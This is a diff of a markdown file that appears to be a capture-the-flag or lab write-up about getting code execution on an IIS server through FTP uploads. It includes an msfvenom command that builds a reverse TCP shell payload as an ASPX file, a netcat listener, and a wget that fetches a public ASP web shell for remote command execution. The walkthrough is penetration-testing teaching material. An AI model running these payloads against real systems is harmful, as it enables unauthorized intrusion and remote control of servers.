@@ -151,7 +151,7 @@ Since we have a direct way to upload files to the web server directory and it al
 These servers usually use ASP or ASPX format for server-side processing, so initially we would probably craft ourselves an aspx shell using ``msfvenom -p windows/x64/shell_reverse_tcp LHOST=[YOUR IP] LPORT=[LISTENER PORT] -f aspx > shell.aspx``, I also did the same but with the ASP format. For now let’s assume a 64 bit architecture. I upload both my crafted shells with a ``nc -lnvp [port]`` running but when I visit the /upload/[shellname] URI’s I receive the following error.
 
 ![img](assets/shell_fail_format.png)
-'
+
 The page is stating that the page cannot be loaded due to the filename extension. This is with all formats - except the ASP format which just shows a blank page. This means that the web server can execute asp files, however my listener does not catch a connection, the reverse TCP is being blocked.
 
 ASP files can still be used to execute server commands in the form of a web shell, unlike a reverse TCP which creates a connection between two hosts, a web shell will take a command input parameter and then execute it, thereby facilitating remote command execution. There is an asp web shell made by tennc on github that we can download and use from ``wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/asp/cmd.asp`` and upload it to the FTP. 
